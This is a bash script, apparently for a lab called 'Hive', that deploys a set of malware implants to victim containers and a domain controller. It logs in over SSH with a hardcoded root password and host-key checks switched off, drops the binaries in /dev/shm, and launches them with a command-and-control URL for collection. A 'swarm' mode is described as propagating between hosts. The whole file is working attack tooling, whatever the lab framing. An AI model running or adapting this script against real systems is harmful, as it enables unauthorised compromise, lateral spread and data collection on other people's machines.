#!/bin/bash
# Hive Lab Deploy — infects victim containers with the colony.
# Usage: bash lab_deploy.sh [victim1|victim2|dc01|all]

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

deploy_to() {
    local host=$1
    local ip=$2
    echo -e "${CYAN}[deploy] Infectando $host ($ip)...${NC}"
    
    # Copy hive binaries via SSH
    sshpass -p 'root123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        target/release/worker target/release/drone target/release/honeybee \
        target/release/weaver target/release/queen target/release/swarm \
        "root@$ip:/dev/shm/" 2>/dev/null

    # Launch the Worker first (creates the arena)
    sshpass -p 'root123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "root@$ip" "chmod +x /dev/shm/* && HIVE_C2_URL=https://operator:8443/collect /dev/shm/worker &" 2>/dev/null
    
    sleep 2
    
    # Launch the rest
    sshpass -p 'root123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "root@$ip" "/dev/shm/drone & /dev/shm/honeybee & /dev/shm/weaver & /dev/shm/queen &" 2>/dev/null
    
    echo -e "${GREEN}[deploy] $host infectado. Verifica http://localhost:8080${NC}"
}

deploy_swarm_to() {
    local host=$1
    local ip=$2
    echo -e "${CYAN}[deploy] Lanzando SWARM en $host ($ip)...${NC}"
    
    sshpass -p 'root123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        target/release/swarm "root@$ip:/dev/shm/swarm" 2>/dev/null
    
    sshpass -p 'root123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "root@$ip" "chmod +x /dev/shm/swarm && HIVE_C2_URL=https://operator:8443/collect /dev/shm/swarm &" 2>/dev/null
    
    echo -e "${GREEN}[deploy] SWARM propagándose desde $host${NC}"
}

case "${1:-all}" in
    victim1)
        deploy_to "victim1" "192.168.10.10"
        ;;
    victim2)
        deploy_to "victim2" "192.168.10.11"
        ;;
    dc01)
        deploy_to "dc01" "192.168.10.12"
        ;;
    swarm)
        deploy_swarm_to "victim1" "192.168.10.10"
        ;;
    all)
        echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║   HIVE LAB — Desplegando Colonia     ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
        echo ""
        deploy_to "victim1" "192.168.10.10"
        sleep 3
        deploy_to "victim2" "192.168.10.11"
        sleep 3
        deploy_to "dc01" "192.168.10.12"
        echo ""
        echo -e "${GREEN}╔══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   COLONIA DESPLEGADA                 ║${NC}"
        echo -e "${GREEN}║   3 hosts infectados                 ║${NC}"
        echo -e "${GREEN}║   Dashboard: http://localhost:8080    ║${NC}"
        echo -e "${GREEN}║   C2:        http://localhost:8443    ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════╝${NC}"
        ;;
    *)
        echo "Usage: bash lab_deploy.sh [victim1|victim2|dc01|swarm|all]"
        ;;
esac
